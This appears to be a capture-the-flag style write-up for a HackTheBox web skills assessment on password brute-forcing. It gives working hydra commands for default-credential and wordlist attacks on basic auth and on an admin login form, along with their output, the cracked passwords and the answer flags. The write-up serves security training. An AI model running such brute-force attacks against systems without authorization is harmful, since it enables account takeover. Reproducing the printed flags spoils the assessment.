# Skills Assessment - Website

Our customer requested an additional black box penetration test for another host on its network. After our host and port scans, we discovered just one single TCP port open. Since we've already found weak credentials on the other host, the new host may be vulnerable to the same vulnerability type. We should consider different wordlists as well during our engagement.

**Questions**

When you try to access the IP shown above, you will not have authorization to access it. Brute force the authentication and retrieve the flag.

```bash
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 83.136.251.235 -s 57805 http-get /   
#[57805][http-get] host: 83.136.251.235   login: user   password: password
HTB{4lw4y5_ch4n63_d3f4ul7_p455w0rd5}
```

Once you access the login page, you are tasked to brute force your way into this page as well. What is the flag hidden inside?

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt -f 83.136.251.235 -s 57805 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'" -t 64 
#[57805][http-post-form] host: 83.136.251.235   login: user   password: harrypotter
HTB{c0mm0n_p455w0rd5_w1ll_4lw4y5_b3_h4ck3d!} 
```
